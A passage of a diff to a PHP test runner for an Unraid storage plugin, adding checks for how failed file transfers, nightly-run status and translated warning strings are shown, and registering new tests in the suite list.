+    same('jack chaos page: failedText — per file, both ways, nothing without `failed` or out of its shape',
+        ['failed.fill {"n":2}', 'failed.back {"n":1}', '', '', 'failed.fill {"n":1} — failed.vanished {"n":1}'], $j['failed'] ?? null);
+    check('jack chaos page: … in the run\'s summary in his list', str_contains((string) ($j['summary'] ?? ''), ' · failed.fill {"n":2}'), (string) ($j['summary'] ?? ''));
+    same('jack chaos page: her last joint run — «done — Jack Streamer: 2 files not laid out»; done alone without; missed keeps its words',
+        ['night.last {"when":"R2000","how":"night.last_ok — night.jack_failed {\"n\":2}"}', 'night.last {"when":"R2000","how":"night.last_ok"}',
+         'night.last {"when":"R2000","how":"night.last_missed {\"pct\":81} — night.jack_failed {\"n\":2}"}'], $j['lastNight'] ?? null);
+    same('jack chaos page: her «Last run» (her part of that night) — his files said under it, a warning; without them green; a run of hers before the night: nothing of his',
+        [['mode.run · result.ok', 'night.jack_failed {"n":2}'], true, [['mode.run · result.ok'], false], ['mode.run · result.ok']],
+        [$j['herTile'][0] ?? null, $j['herTile'][1] ?? null, $j['herOk'] ?? null, $j['herBefore'] ?? null]);
+    same('jack chaos page: her schedule section — a warning chip with his count and why, the way to his page', [['night.jack_failed {"n":2}', 'night.jack_failed_tip']], $j['chip'] ?? null);
+
+    // (4) the words ×5: plural counts, the same placeholders
+    foreach (['de', 'en', 'it', 'fr', 'es'] as $lang) {
+        $jl = readJson(OFFICE_WEB . "/desks/jack/lang/$lang.json") ?? [];
+        $ml = readJson(OFFICE_WEB . "/desks/moverelli/lang/$lang.json") ?? [];
+        check("jack chaos words ($lang): his look's bubble/notice/tile, failed files as plurals; her night line",
+            is_string($jl['bubble.running_report'] ?? null) && is_string($jl['bubble.running_dry'] ?? null) && is_string($jl['notice.running_report'] ?? null)
+            && is_string($jl['notice.running_dry'] ?? null) && str_contains((string) ($jl['last.looking'] ?? ''), '{mode}')
+            && is_array($jl['failed.fill'] ?? null) && is_array($jl['failed.back'] ?? null) && is_array($jl['notify.not_copied'] ?? null) && is_array($jl['notify.not_back'] ?? null)
+            && str_contains((string) ($jl['failed.vanished']['other'] ?? ''), '--delete')
+            && is_array($ml['night.jack_failed'] ?? null) && str_contains((string) ($ml['night.jack_failed']['other'] ?? ''), 'Jack Streamer') && is_string($ml['night.jack_failed_tip'] ?? null));
+    }
+    $de = readJson(OFFICE_WEB . '/desks/jack/lang/de.json') ?? [];
+    check('jack chaos words (de): a report is no «Bereitlegen»', !str_contains(strtolower((string) $de['bubble.running_report'] . $de['notice.running_report']), 'lege gerade bereit')
+        && !str_contains((string) $de['bubble.running_report'], 'Bereitlegen'));
     hardeningRm($tmp);
 }
 
@@ -50346,10 +50721,10 @@ JS;
 
 $parts = ['logic' => ['testCron', 'testRetention', 'testPlanGone', 'testSnapPlansTolerant', 'testSleepingPools', 'testSnapshotNames', 'testJack', 'testJackWatch', 'testJackSizes', 'testJackShareDataset', 'testJackPool', 'testJackImport', 'testJackForeign', 'testOfficeCron', 'testCaretakerCronLook', 'testMenuName', 'testSetupListDiff', 'testNoScriptNames', 'testPhpVarNames', 'testDetailsKept', 'testSetupDiscard', 'testWhereArrayZfs', 'testEstimates', 'testBackupFirstUpload', 'testBackupRough', 'testNotify', 'testNotifyLayout', 'testNotifyCenter', 'testCaretakerAcks', 'testAckContent', 'testJackLetGo', 'testJackMover', 'testJackGatherCache', 'testJackRsync', 'testJackTidyDisks', 'testJackKeyRedirect', 'testJackUpstream', 'testJackPersons', 'testJackNotInBudget', 'testJackProgress', 'testJackReadyShares',
                       'testLogsFlood',
-                      'testMoverelliFit', 'testMoverelliIni', 'testMoverelliIniTolerant', 'testMoverelliMoveBin', 'testMoverelliRun', 'testMoverelliGates', 'testMoverelliForeign', 'testMoverelliPage', 'testRefusedRowWords', 'testMoverelliImport', 'testNightPlan', 'testNightRun', 'testNightOrder', 'testNightHerPool', 'testNightPicture', 'testMoverelliRunPicture', 'testNightJackCard', 'testNightJackInHerCard', 'testNightSteps', 'testNightReserve', 'testNightSnaps', 'testPoolJackOutside', 'testPoolNonZfs', 'testMoverelliSharesGone', 'testMoverelliTiles', 'testMoverelliSuggestJack', 'testMoverelliUnraid', 'testMoverelliStop', 'testMoverelliArrayStop', 'testMoverelliPowerCut', 'testMoverelliNothingMoved', 'testMoverelliCardLag', 'testMoverelliCardFile', 'testMoverelliLeftWhy', 'testMoverelliSyncMoved', 'testMoverelliTwins', 'testMoverelliEta', 'testMoverelliPreferDisks', 'testMoverelliTidy', 'testMoverelliShareRoot', 'testMoverelliTrailingSpace', 'testMoverelliFuture', 'testMoverelliLeftCodesPage', 'testOfficeFmtSize', 'testMoverelliIdleRules', 'testMoverelliPageTruth', 'testGreetTruth', 'testMoverelliFill', 'testPoolLevel', 'testPoolBytes', 'testStreamerTab', 'testJackRemoveServer', 'testJackSaveReconnect', 'testJackConnectNoChange', 'testJackByWords', 'testStreamerBudget', 'testStreamerReset', 'testStreamerFix3', 'testStreamerShares', 'testJackYield',
+                      'testMoverelliFit', 'testMoverelliIni', 'testMoverelliIniTolerant', 'testMoverelliMoveBin', 'testMoverelliRun', 'testMoverelliGates', 'testMoverelliForeign', 'testMoverelliPage', 'testRefusedRowWords', 'testMoverelliImport', 'testNightPlan', 'testNightRun', 'testJackChaos', 'testNightOrder', 'testNightHerPool', 'testNightPicture', 'testMoverelliRunPicture', 'testNightJackCard', 'testNightJackInHerCard', 'testNightSteps', 'testNightReserve', 'testNightSnaps', 'testPoolJackOutside', 'testPoolNonZfs', 'testMoverelliSharesGone', 'testMoverelliTiles', 'testMoverelliSuggestJack', 'testMoverelliUnraid', 'testMoverelliStop', 'testMoverelliArrayStop', 'testMoverelliPowerCut', 'testMoverelliNothingMoved', 'testMoverelliCardLag', 'testMoverelliCardFile', 'testMoverelliLeftWhy', 'testMoverelliSyncMoved', 'testMoverelliTwins', 'testMoverelliEta', 'testMoverelliPreferDisks', 'testMoverelliTidy', 'testMoverelliShareRoot', 'testMoverelliTrailingSpace', 'testMoverelliFuture', 'testMoverelliLeftCodesPage', 'testOfficeFmtSize', 'testMoverelliIdleRules', 'testMoverelliPageTruth', 'testGreetTruth', 'testMoverelliFill', 'testPoolLevel', 'testPoolBytes', 'testStreamerTab', 'testJackRemoveServer', 'testJackSaveReconnect', 'testJackConnectNoChange', 'testJackByWords', 'testStreamerBudget', 'testStreamerReset', 'testStreamerFix3', 'testStreamerShares', 'testJackYield',
                       'testBackupPackages', 'testBackupKopiaItems', 'testBackupKopiaWord', 'testBackupNewLocal', 'testBackupNewLocalOffice', 'testBackupPlace', 'testSetupUnfold', 'testSetupFilter', 'testSetupTiles', 'testSetupFirstPlace', 'testBackupPlaceOffer', 'testSetupAsleepKept', 'testSetupGoneApp', 'testSetupStoppedKept', 'testSetupNoDocker', 'testSetupBom', 'testSetupDupKey', 'testSetupUntrusted', 'testSetupKopiaGone', 'testSetupDockerOffKeeps', 'testSetupOldUserScript', 'testSetupPoolGone', 'testBackupPresets', 'testBackupSkip', 'testBackupVmOrder', 'testBackupVmWarn', 'testBackupBtrfsBrake', 'testPartnerAtOnce', 'testBackupArrayStop', 'testBackupPruneOwn', 'testBackupKopiaAutostart', 'testBackupKopiaOrder', 'testAgentBackupHooks', 'testBackupRecoverNotes', 'testDataTrust', 'testBackupNotifyLang', 'testNotifyPlain', 'testJackStreamerName', 'testRetentionPartner', 'testOfficeHome', 'testBackupEpipe', 'testBackupPartnerPhase', 'testBackupInside', 'testBackupPartnerOffice', 'testPartnerEnded', 'testPartnerStaleName', 'testBackupAsleep', 'testBackupAsleepOffice', 'testIcons', 'testIconSquare', 'testRestore', 'testRestoreJobs', 'testRestoreRunCard', 'testRestoreVmFit', 'testRestoreVmForeign', 'testRestoreStack', 'testSetupMakeDataset', 'testRestoreShares', 'testRestoreNextcloud', 'testRestoreFindings', 'testRestoreDatabases', 'testRestoreDbStopped', 'testRestoreNames', 'testRestoreInUse', 'testRestoreSettled', 'testRestoreUnfinished', 'testRestoreArrayStopWhy', 'testRestoreMeasuring', 'testRestorePutbackDb', 'testRestoreConfigNoTemplate', 'testRestoreDrill', 'testDrillSqliteAppIndex', 'testDrillShareFile', 'testDrillImageData', 'testRestorePartner', 'testPartnerTicket', 'testPartnerStart', 'testWatchmanTicket', 'testPartnerSendBack', 'testWatchmanPartner', 'testWatchmanNet', 'testWatchmanNetMikrotik', 'testSnapshotPartner', 'testVmOrphans', 'testCleanupPartner', 'testLogsPartner', 'testAdvisor', 'testAdvisorDockerOff', 'testAdvisorInstall', 'testAdvisorOldTemplate', 'testAdvisorRecord', 'testAdvisorObjectLock', 'testAdvisorPartnerGuide', 'testLogsTour', 'testLogsRules', 'testLogsMine', 'testLogsFilters', 'testLogsFiltersPage', 'testLogsWakes', 'testMetrics', 'testWatchman', 'testWatchmanGone', 'testWatchmanSerious', 'testWatchmanAtUserScript', 'testWatchmanSched', 'testWatchmanOffice', 'testWatchmanFlow', 'testWatchmanFlowGone', 'testWatchmanFlowFiles', 'testWatchmanPosture', 'testWatchmanPrivilegedStopped', 'testWatchmanSnaps', 'testWatchmanHost', 'testWatchmanNight', 'testWatchmanBoot', 'testNightUi', 'testJobGuard', 'testComposeBuilds', 'testUnraidPath', 'testExclusive', 'testWatchmanGoLines', 'testWatchmanFlowSources', 'testWatchmanNetMikrotikBook', 'testAdvisorMikrotikGuide', 'testDashboardJobs', 'testBackupKopiaOrphans', 'testBackupOldSourcesPage', 'testKopiaEmptied', 'testKopiaLockGuard', 'testBackup74Polish', 'testBackupAppShare', 'testSetupLeftUnsaved', 'testTipNeverKept', 'testSilentControlsMore', 'testBackupAsleepNoMust', 'testSetupUnknownKey', 'testBackupVolumeCache', 'testBackupGonePackage', 'testBackupMovedPackage', 'testSetupApplyHonest', 'testBackupNcOpen', 'testBackupPausedStopped', 'testSetupSearch', 'testBackupPlaceVerdict', 'testWatchmanFlowGuess', 'testBackupLastRunEnded', 'testOffsiteReach', 'testDockerSilent', 'testKopiaHang', 'testKopiaWatch', 'testWatchmanHold', 'testBackupBatchH',
                       'testWhereAfterWatchman', 'testWhereVmStop', 'testWhereVmMigratable', 'testWhereTunables', 'testBackupSparse', 'testWhereTakeOver', 'testWhereDesk', 'testWhereBuilding', 'testCleanupTick', 'testStaffMerged', 'testStaffOrder', 'testHireWith', 'testHireNeeds', 'testMovedDesk', 'testMigrateJackId', 'testMigrateMediaCache', 'testSupporter', 'testLeftovers', 'testOfficeLanguage', 'testThemeSwitch', 'testSizeSwitch', 'testApiLook', 'testLookPage', 'testLookOldRun', 'testUpdateNotice', 'testReportDialog', 'testSearchPlaces', 'testSearchItems', 'testSearchGuides', 'testApiGzip', 'testWatchmanApiDoor', 'testCaretakerApi', 'testCaretakerNetworks', 'testSetupMessages', 'testDriftCodes', 'testIconStacks', 'testPartnerPairing', 'testPartnerWatch', 'testPartnerGone', 'testPartnerRelease', 'testPartnerUnits', 'testPartnerTolerant', 'testMigrate', 'testBackupReplan', 'testBackupPairsReplan', 'testUnraidTested', 'testCronBack', 'testPlgGuard', 'testPlgInstall', 'testWatchmanRoundWait', 'testPlgRemove', 'testBackupLetGo', 'testBackupAbortAsked', 'testJackSetupFresh', 'testApiGetOffline', 'testSupporterList', 'testReportDialogImages', 'testReportDialogDiagnostics',
-                      'testFlockShfs', 'testBackupOneMinute', 'testStrictSettings', 'testRestoreClientEcho', 'testWatchBookView', 'testWatchFilter', 'testWatchBookNoteSome', 'testWatchmanAtPlugin', 'testParityWhy', 'testCleanupVolumes', 'testHiddenStoreroom', 'testFilterWords', 'testFilterBar', 'testOfficeJobScheduleNext', 'testBackupTiles', 'testBackupPartnerEta', 'testJackLastRunDuringRun', 'testJackListLost', 'testJackPoolTileBudget', 'testSnapPoolSplit', 'testSnapArrayDisks', 'testTilesMediaPages', 'testCleanupInUseLocked', 'testCleanupOrphanDatasets', 'testCleanupSnapOnly', 'testCleanupSnapKept', 'testCleanupDrillCopies', 'testStaleShares', 'testCleanupTiles', 'testRestoreTiles', 'testTilesConvention', 'testSections', 'testDeskPages'],
+                      'testFlockShfs', 'testBackupOneMinute', 'testStrictSettings', 'testRestoreClientEcho', 'testWatchBookView', 'testWatchFilter', 'testWatchBookNoteSome', 'testWatchmanAtPlugin', 'testWatchmanBootNoise', 'testParityWhy', 'testCleanupVolumes', 'testHiddenStoreroom', 'testFilterWords', 'testFilterBar', 'testOfficeJobScheduleNext', 'testBackupTiles', 'testBackupPartnerEta', 'testJackLastRunDuringRun', 'testJackListLost', 'testJackPoolTileBudget', 'testSnapPoolSplit', 'testSnapArrayDisks', 'testTilesMediaPages', 'testCleanupInUseLocked', 'testCleanupOrphanDatasets', 'testCleanupSnapOnly', 'testCleanupSnapKept', 'testCleanupDrillCopies', 'testStaleShares', 'testCleanupTiles', 'testRestoreTiles', 'testTilesConvention', 'testSections', 'testDeskPages'],
           'hardening' => ['testRequestTypes', 'testFirstHome', 'testSafeWrites', 'testAgentRestarted', 'testHeartbeat', 'testDoorbell', 'testAgentClock', 'testAgentZone', 'testHouseDockerSilent', 'testDockerGuard', 'testNotifyToldLately', 'testHostLaunchAtd', 'testCleanupStoreroomDisks', 'testSnapshotRecord', 'testTrashManifest', 'testJackPaths', 'testAnchors', 'testUpdateClean', 'testAdvisorSecrets', 'testSupporterKeys', 'testPartnerDoor', 'testReport', 'testReportImages', 'testReportDiagnostics', 'testReportSlots', 'testReportDiagScrub', 'testReportStatus', 'testReportInbox', 'testRunnerNames', 'testSnapshotIds', 'testAgentHired', 'testSupporterClaim'],
           'strings' => ['testStrings', 'testUnraidWords', 'testNoNightWords']];
 // php tests/run.php [<part>|<test> …] — no name: everything; else every named part and test, each once, in the order of
